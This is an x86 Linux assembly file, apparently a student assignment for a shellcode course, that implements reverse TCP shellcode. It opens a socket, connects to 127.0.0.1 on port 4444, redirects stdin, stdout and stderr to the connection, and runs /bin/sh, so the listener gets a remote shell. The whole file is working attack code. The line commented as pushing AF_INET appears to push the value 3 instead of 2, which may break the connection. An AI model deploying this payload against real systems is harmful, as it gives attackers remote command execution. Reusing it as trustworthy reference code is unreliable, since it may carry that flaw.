; SLAE - Assignment #2: Shell Reverse TCP (Linux/x86) 
; Author:  Dipsy
; Student ID: SLAE-1535

global _start

section .text
_start:


	; Create the socket
	sub eax, eax 
	mov al, 0x66 		; socketcall (102)

	sub ebx, ebx
	mov bl, 0x1		; SYS_SOCKET (1)

	sub ecx, ecx 
	push ecx 		; protocol (0)

	push ebx		; SOCK_STREAM (1)

	push 0x2		; AF_INET (2)

	mov ecx, esp		; point ecx to TOS
	int 0x80		; execute socket

	mov esi, eax		; move socket to esi


	; Connect to an IP and port
	
	mov al, 0x66		; socketcall (102)

	mov bl, 0x3		; SYS_CONNECT (3)

	sub edx, edx
	push edx		; NULL Terminator 

	push 0x0100007f		;s_addr = 127.0.0.1
	push word 0x5c11	; sin_port = 4444

	push bx			; AF_INET (2)

	mov ecx, esp		; point ecx to top of stack

	push 0x10		; sizeof(host_addr)

	push ecx		; pointer to host_addr struct

	push esi		; socketfd
	
	mov ecx, esp		; point ecx to top of stack 
	int 0x80		; execute connect 
	
	

	; Redirect STDIN, STDERR, STDOUT
	
	mov ebx, esi 		; move socketfd into ebx for dup2

	sub ecx, ecx		; zero out ecx
	mov cl, 0x2 		; set the counter
	
loop:
	mov al, 0x3f		; dup2 (63)
	int 0x80		; exec dup2
	dec ecx			; decrement counter
	jns loop		; jump until SF is set

	; Execute /bin/sh

	push edx		; NULL
	push 0x68732f2f		; "hs//"
	push 0x6e69622f 	; "nib/"
	mov ebx, esp		; point ebx to stack
	mov ecx, edx		; NULL
	mov al, 0xb		; execve
	int 0x80		; execute execve

